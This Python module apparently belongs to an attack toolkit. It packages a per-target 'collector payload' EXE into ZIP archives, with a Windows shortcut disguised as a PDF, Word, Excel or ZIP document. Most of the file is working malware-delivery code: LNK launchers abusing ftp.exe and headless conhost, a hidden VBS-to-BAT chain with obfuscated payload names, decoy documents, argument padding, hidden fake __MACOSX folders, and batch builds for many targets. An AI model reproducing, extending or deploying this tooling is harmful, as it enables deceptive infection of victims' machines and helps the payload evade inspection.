import os
import json
import shutil
import tempfile
import threading
import zipfile

import pylnk3

from .exe_builder import BASE_DIR, BUILD_DIR, OUTPUT_DIR, build_exe
from .config_manager import load_config, resolve_exe_name

LNK_REGISTRY_PATH = os.path.join(BASE_DIR, 'data', 'lnk_registry.json')

# Disguised extension used for both the LNK name and its icon
LURE_EXT_CHOICES = ('pdf', 'docx', 'xlsx', 'zip')
DEFAULT_LURE_EXT = 'pdf'

# System icons available on stock Windows; used because a custom .ico cannot
# be referenced reliably from an extracted archive.
LNK_ICON_MAP = {
    'pdf': ('%SystemRoot%\\System32\\SHELL32.dll', 70),
    'docx': ('%SystemRoot%\\System32\\SHELL32.dll', 70),
    'xlsx': ('%SystemRoot%\\System32\\SHELL32.dll', 70),
    'zip': ('%SystemRoot%\\System32\\SHELL32.dll', 31),
}

FTP_PATH = r'C:\Windows\System32\ftp.exe'
CONHOST_PATH = r'C:\Windows\System32\conhost.exe'
WSCRIPT_PATH = r'C:\Windows\System32\wscript.exe'
ARG_PAD = ' ' * 200

EVASION_OPTIONS = (
    ('conhost', 'conhost 无窗口执行',
     'LNK 调用 conhost.exe --headless 读取命令文件，不弹出控制台窗口（Windows 10 1809+）。'),
    ('vbs', 'Explorer → VBS → BAT 隐藏链',
     'LNK 启动 VBS，再由 VBS 隐藏运行 BAT 拉起载荷，增加静态分析层级。'),
    ('obfuscate', '字符串拆分 + 干扰码',
     'BAT 中拆分拼接载荷名并插入延时干扰命令（自动启用 VBS 链）。'),
    ('decoy', '打开诱饵文档',
     '载荷启动后自动打开隐藏的同后缀诱饵文档，转移注意力（自动启用 VBS 链）。'),
    ('pad', '参数空白填充',
     '在 LNK 参数前填充大量空格，属性面板中不易直接看到真实参数。'),
    ('macosx', '伪装 __MACOSX 目录',
     '把载荷目录嵌套为 __MACOSX 层级并隐藏，模拟压缩包元数据目录。'),
)
EVASION_CHOICES = tuple(key for key, _, _ in EVASION_OPTIONS)

_lock = threading.Lock()


def _load_registry():
    os.makedirs(os.path.dirname(LNK_REGISTRY_PATH), exist_ok=True)
    if not os.path.exists(LNK_REGISTRY_PATH):
        return {}
    with open(LNK_REGISTRY_PATH, 'r', encoding='utf-8') as f:
        return json.load(f)


def _save_registry(reg):
    os.makedirs(os.path.dirname(LNK_REGISTRY_PATH), exist_ok=True)
    with open(LNK_REGISTRY_PATH, 'w', encoding='utf-8') as f:
        json.dump(reg, f, ensure_ascii=False, indent=2)


def register_lnk(token, filename):
    with _lock:
        reg = _load_registry()
        reg[token] = filename
        _save_registry(reg)


def unregister_lnk(token):
    with _lock:
        reg = _load_registry()
        reg.pop(token, None)
        _save_registry(reg)


def is_lnk_registered(token):
    with _lock:
        return token in _load_registry()


def get_lnk_filename(token):
    with _lock:
        return _load_registry().get(token)


def get_lnk_path(token):
    filename = get_lnk_filename(token)
    if not filename:
        return None
    return os.path.join(OUTPUT_DIR, filename)


def clear_lnk_registry():
    with _lock:
        _save_registry({})


def _safe_name(name):
    for ch in '<>:"/\\|?*':
        name = name.replace(ch, '_')
    name = ''.join(c for c in name if ord(c) >= 32)
    return name.strip(' .') or 'target'


def lnk_zip_name(target_name, token, exe_filename=''):
    base = _safe_name(resolve_exe_name(target_name, token, exe_filename))
    return base + '.zip'


def _lure_ext(config):
    ext = str(config.get('lnk_lure_ext', DEFAULT_LURE_EXT)).lower()
    return ext if ext in LURE_EXT_CHOICES else DEFAULT_LURE_EXT


def _evasion(config):
    selected = config.get('lnk_evasion') or []
    if not isinstance(selected, list):
        return set()
    return {e for e in selected if e in EVASION_CHOICES}


def _lnk_display_name(base, ext):
    if base.lower().endswith('.' + ext):
        return base + '.lnk'
    return f'{base}.{ext}.lnk'


def _write_lnk(lnk_path, target, arguments, ext):
    icon_file, icon_index = LNK_ICON_MAP.get(ext, LNK_ICON_MAP[DEFAULT_LURE_EXT])
    pylnk3.for_file(
        target,
        lnk_path,
        arguments=arguments,
        icon_file=icon_file,
        icon_index=icon_index,
        window_mode=pylnk3.WINDOW_MINIMIZED,
    )


def _add_hidden_file(zf, arcname, source_path):
    info = zipfile.ZipInfo(arcname)
    info.create_system = 0  # FAT: external_attr holds DOS attributes
    info.external_attr = 0x22  # hidden | archive
    info.compress_type = zipfile.ZIP_DEFLATED
    with open(source_path, 'rb') as f:
        zf.writestr(info, f.read())


def _add_hidden_dir(zf, arcname):
    info = zipfile.ZipInfo(arcname.rstrip('/') + '/')
    info.create_system = 0
    info.external_attr = 0x16  # directory | hidden | system
    info.compress_type = zipfile.ZIP_STORED
    zf.writestr(info, b'')


def _write_command_file(script_path, commands, ftp_mode):
    # ftp.exe runs '!'-prefixed lines through cmd; conhost mode feeds the file
    # straight to cmd's stdin.
    with open(script_path, 'w', encoding='ascii', newline='\r\n') as f:
        for command in commands:
            f.write(('!' if ftp_mode else '') + command + '\n')
        f.write('bye\n' if ftp_mode else 'exit\n')


def _write_vbs(vbs_path):
    lines = (
        'On Error Resume Next',
        'Set sh = CreateObject("WScript.Shell")',
        'Set fso = CreateObject("Scripting.FileSystemObject")',
        'd = fso.GetParentFolderName(WScript.ScriptFullName)',
        'sh.Run Chr(34) & d & "\\run.bat" & Chr(34), 0, False',
    )
    with open(vbs_path, 'w', encoding='ascii', newline='\r\n') as f:
        for line in lines:
            f.write(line + '\n')


def _write_bat(bat_path, decoy_name, obfuscate):
    payload = 'viewer.exe'
    lines = ['@echo off', 'setlocal EnableDelayedExpansion']
    if obfuscate:
        lines += [
            'for /l %%i in (1,1,3) do (',
            'ver >nul',
            'ping 127.0.0.1 -n 2 >nul',
            ')',
        ]
        for i, ch in enumerate(payload, 1):
            lines.append(f'set "p{i}={ch}"')
        lines.append('set "exe="')
        lines.append(f'for /l %%n in (1,1,{len(payload)}) do set "exe=!exe!!p%%n!"')
    else:
        lines.append(f'set "exe={payload}"')
    # explorer.exe hands the file to the shell and returns immediately, so the
    # payload outlives this script without showing a console.
    lines.append('"C:\\Windows\\explorer.exe" "%~dp0!exe!"')
    if decoy_name:
        lines.append(f'"C:\\Windows\\explorer.exe" "%~dp0{decoy_name}"')
    lines.append('exit /b')
    with open(bat_path, 'w', encoding='ascii', newline='\r\n') as f:
        for line in lines:
            f.write(line + '\n')


_OFFICE_HEADER = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'

_DOCX_CONTENT_TYPES = _OFFICE_HEADER + (
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
    '</Types>')

_DOCX_DOCUMENT = _OFFICE_HEADER + (
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    '<w:body><w:p><w:r><w:t>内部资料，请勿外传。</w:t></w:r></w:p></w:body>'
    '</w:document>')

_XLSX_CONTENT_TYPES = _OFFICE_HEADER + (
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
    '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
    '</Types>')

_XLSX_WORKBOOK = _OFFICE_HEADER + (
    '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>')

_XLSX_WORKBOOK_RELS = _OFFICE_HEADER + (
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
    '</Relationships>')

_XLSX_SHEET = _OFFICE_HEADER + (
    '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
    '<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>内部资料</t></is></c></row></sheetData>'
    '</worksheet>')

def _build_minimal_pdf():
    objects = (
        b'<</Type/Catalog/Pages 2 0 R>>',
        b'<</Type/Pages/Kids[3 0 R]/Count 1>>',
        b'<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]>>',
    )
    out = bytearray(b'%PDF-1.4\n')
    offsets = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b'%d 0 obj' % number + body + b'endobj\n'
    xref = len(out)
    out += b'xref\n0 %d\n' % (len(objects) + 1)
    out += b'0000000000 65535 f \n'
    for offset in offsets:
        out += b'%010d 00000 n \n' % offset
    out += (b'trailer\n<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n'
            % (len(objects) + 1, xref))
    return bytes(out)


_MINIMAL_PDF = _build_minimal_pdf()


def _office_rels(target):
    return _OFFICE_HEADER + (
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        f'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="{target}"/>'
        '</Relationships>')


def _write_decoy(decoy_path, ext):
    if ext == 'pdf':
        with open(decoy_path, 'wb') as f:
            f.write(_MINIMAL_PDF)
    elif ext == 'docx':
        with zipfile.ZipFile(decoy_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('[Content_Types].xml', _DOCX_CONTENT_TYPES)
            zf.writestr('_rels/.rels', _office_rels('word/document.xml'))
            zf.writestr('word/document.xml', _DOCX_DOCUMENT)
    elif ext == 'xlsx':
        with zipfile.ZipFile(decoy_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('[Content_Types].xml', _XLSX_CONTENT_TYPES)
            zf.writestr('_rels/.rels', _office_rels('xl/workbook.xml'))
            zf.writestr('xl/workbook.xml', _XLSX_WORKBOOK)
            zf.writestr('xl/_rels/workbook.xml.rels', _XLSX_WORKBOOK_RELS)
            zf.writestr('xl/worksheets/sheet1.xml', _XLSX_SHEET)
    else:
        with zipfile.ZipFile(decoy_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('说明.txt', '内部资料，解压后查看。\n')


def _payload_folder(token, evasion):
    if 'macosx' in evasion:
        return '\\'.join(['__MACOSX'] * 3)
    return 'cache_' + token[:8]


def build_lnk_zip(server_url, token, target_name, exe_filename=''):
    """Build a target EXE and wrap it in a ZIP with a disguised LNK launcher.

    Layout after extraction:
        <doc-name>.pdf.lnk          visible shortcut
        <hidden folder>/viewer.exe  collector payload
        <hidden folder>/data.dat    command file that launches the payload
    Optional evasion layers add run.vbs / run.bat and a decoy document.
    """
    config = load_config()
    ext = _lure_ext(config)
    evasion = _evasion(config)
    use_vbs = bool(evasion & {'vbs', 'obfuscate', 'decoy'})
    use_conhost = 'conhost' in evasion
    use_decoy = 'decoy' in evasion

    exe_path = build_exe(server_url, token, target_name, exe_filename)
    base = _safe_name(resolve_exe_name(target_name, token, exe_filename))
    zip_name = base + '.zip'
    lnk_name = _lnk_display_name(base, ext)

    os.makedirs(BUILD_DIR, exist_ok=True)
    staging = tempfile.mkdtemp(prefix=f'lnk_{token[:8]}_', dir=BUILD_DIR)
    payload_name = 'viewer.exe'
    script_name = 'data.dat'
    vbs_name = 'run.vbs'
    bat_name = 'run.bat'
    decoy_name = f'preview.{ext}' if use_decoy else ''
    folder = _payload_folder(token, evasion)
    folder_dir = os.path.join(staging, *folder.split('\\'))

    try:
        os.makedirs(folder_dir)
        shutil.copy2(exe_path, os.path.join(folder_dir, payload_name))

        if use_vbs:
            _write_bat(os.path.join(folder_dir, bat_name), decoy_name,
                       'obfuscate' in evasion)
            _write_vbs(os.path.join(folder_dir, vbs_name))
            launch = f'{WSCRIPT_PATH} "{folder}\\{vbs_name}"'
        else:
            launch = f'{folder}\\{payload_name}'
        _write_command_file(os.path.join(folder_dir, script_name), [launch],
                            ftp_mode=not use_conhost)

        if decoy_name:
            _write_decoy(os.path.join(folder_dir, decoy_name), ext)

        if use_conhost:
            target = CONHOST_PATH
            arguments = f'--headless cmd /c "cmd < {folder}\\{script_name}"'
        else:
            target = FTP_PATH
            arguments = f'-s:{folder}\\{script_name}'
        if 'pad' in evasion:
            arguments = ARG_PAD + arguments
        lnk_path = os.path.join(staging, lnk_name)
        _write_lnk(lnk_path, target, arguments, ext)

        arc_folder = folder.replace('\\', '/')
        hidden_files = [payload_name]
        if use_vbs:
            hidden_files += [bat_name, vbs_name]
        if decoy_name:
            hidden_files.append(decoy_name)
        hidden_files.append(script_name)

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        zip_path = os.path.join(OUTPUT_DIR, zip_name)
        tmp_zip = zip_path + '.part'
        with zipfile.ZipFile(tmp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(lnk_path, lnk_name)
            parts = arc_folder.split('/')
            for i in range(1, len(parts) + 1):
                _add_hidden_dir(zf, '/'.join(parts[:i]))
            for name in hidden_files:
                _add_hidden_file(zf, f'{arc_folder}/{name}',
                                 os.path.join(folder_dir, name))
        os.replace(tmp_zip, zip_path)

        register_lnk(token, zip_name)
        return zip_path
    finally:
        shutil.rmtree(staging, ignore_errors=True)


def build_lnk_zips_batch(server_url, targets):
    results = []
    for t in targets:
        try:
            zip_path = build_lnk_zip(
                server_url, t['token'], t['name'], t.get('exe_filename', ''))
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'success': True,
                'zip_path': zip_path,
                'zip_name': os.path.basename(zip_path),
            })
        except Exception as e:
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'success': False,
                'error': str(e),
            })
    return results
